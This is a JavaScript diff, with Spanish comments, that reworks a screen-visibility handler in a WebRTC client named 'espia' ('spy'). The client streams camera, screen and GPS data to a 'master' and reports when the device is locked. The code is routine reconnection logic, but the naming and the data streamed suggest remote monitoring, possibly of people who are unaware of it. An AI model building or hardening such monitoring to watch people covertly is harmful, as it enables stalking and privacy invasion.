@@ -2488,52 +2488,51 @@ const Session = (() => {
             }
           }, 5000);
 
-          // [v2.13.88] VISIBILITY: cuando vuelve visible, intentar reanimar la conexión
-          // y avisar al master por DataChannel para que ajuste UI.
+          // [v2.13.89] VISIBILITY handler. Usa ref.pc (no closure de pc) para
+          // que si la sesión se reinició entre listener-add y dispatch, el handler
+          // viejo no actúe sobre PC zombi. Guards adicionales: chequea
+          // connectionState !== 'closed' antes de restartIce.
           window._espiaCliWH._handlerVisibility = () => {
             const ref = window._espiaCliWH;
             if (!ref) return;
+            const pcAhora = ref.pc;
+            if (!pcAhora) return; // PC zombi/inexistente
             const ahoraVisible = document.visibilityState === 'visible';
-            if (ahoraVisible) {
-              console.log('[espia WH visibility] visible (pantalla desbloqueada o tab volvió)');
-              ref._ultimaVisible = Date.now();
-              // Avisar al master
-              try {
-                if (ref.gpsCh?.readyState === 'open') {
-                  ref.gpsCh.send(JSON.stringify({ __meta: 'visibility', visible: true }));
-                }
-              } catch(_){}
-              // Si ICE quedó en failed/disconnected durante el lock, despertar
-              if (pc.iceConnectionState === 'failed' || pc.iceConnectionState === 'disconnected') {
-                console.log('[espia WH] ICE state post-resume:', pc.iceConnectionState, '· restartIce');
-                try { pc.restartIce(); } catch(_){}
+            try {
+              if (ref.gpsCh?.readyState === 'open') {
+                ref.gpsCh.send(JSON.stringify({ __meta: 'visibility', visible: ahoraVisible }));
               }
-              // Si alguno de los tracks de video murió por OS, intentar reabrir
-              const tracksVivos = [];
-              const tracksMuertos = [];
+            } catch(_){}
+            if (ahoraVisible) {
+              console.log('[espia WH visibility] visible · reanimar');
+              ref._ultimaVisible = Date.now();
+              // restartIce solo si pc NO está cerrado y está en estado que admite reanimar
+              if (pcAhora.connectionState !== 'closed') {
+                let estICE = '';
+                try { estICE = pcAhora.iceConnectionState; } catch(_){ return; }
+                if (estICE === 'failed' || estICE === 'disconnected') {
+                  console.log('[espia WH] ICE post-resume:', estICE, '· restartIce');
+                  try { pcAhora.restartIce(); } catch(_){}
+                }
+              }
+              // Inventario informativo de tracks (no accionable en móvil sin user gesture)
+              let muertos = 0;
               [ref.streams.userMedia, ref.streams.userMedia2, ref.streams.display].forEach(s => {
                 if (!s) return;
-                s.getTracks().forEach(t => {
-                  if (t.readyState === 'ended') tracksMuertos.push({stream: s, track: t});
-                  else tracksVivos.push(t);
-                });
+                s.getTracks().forEach(t => { if (t.readyState === 'ended') muertos++; });
               });
-              if (tracksMuertos.length > 0) {
-                console.warn('[espia WH] ' + tracksMuertos.length + ' track(s) muertos por OS · NO se pueden reabrir sin user gesture');
-                // Por limitación de browsers móviles, getUserMedia post-resume requiere
-                // user gesture. El sync poll ya detectará la sesión muerta y mostrará
-                // mensaje útil al master.
-              }
+              if (muertos > 0) console.warn('[espia WH] ' + muertos + ' track(s) muertos por OS post-lock');
             } else {
-              console.log('[espia WH visibility] hidden (pantalla bloqueada o tab oculto)');
-              try {
-                if (ref.gpsCh?.readyState === 'open') {
-                  ref.gpsCh.send(JSON.stringify({ __meta: 'visibility', visible: false }));
-                }
-              } catch(_){}
+              console.log('[espia WH visibility] hidden · pantalla bloqueada');
             }
           };
+          // [v2.13.89] Limpiar listener viejo por defensiva (caso reinicio sin cerrar
+          // completo). removeEventListener es no-op si no hay listener.
+          if (window.__espiaCliWHVisibilityHandlerPrev) {
+            try { document.removeEventListener('visibilitychange', window.__espiaCliWHVisibilityHandlerPrev); } catch(_){}
+          }
           document.addEventListener('visibilitychange', window._espiaCliWH._handlerVisibility);
+          window.__espiaCliWHVisibilityHandlerPrev = window._espiaCliWH._handlerVisibility;
           window._espiaCliWH._ultimaVisible = Date.now();
           if (window._espiaCliWH.streams.userMedia) {
             // [v2.13.81] contentHint propaga vía SDP (motion=cam, detail=pantalla).
